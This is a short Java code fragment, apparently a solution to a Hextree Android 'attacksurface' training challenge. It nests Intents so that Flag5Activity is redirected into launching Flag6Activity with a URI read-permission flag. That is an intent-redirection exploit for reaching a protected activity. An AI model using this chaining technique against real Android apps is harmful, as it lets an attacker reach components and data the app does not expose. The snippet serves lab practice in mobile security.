        Intent inner = new Intent();
        inner.putExtra("reason","next");
        inner.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        inner.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

        Intent mid = new Intent();
        mid.putExtra("nextIntent",inner);
        mid.putExtra("return",42);

        Intent outer = new Intent();
        outer.putExtra("android.intent.extra.INTENT",mid);
        outer.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
        startActivity(outer);
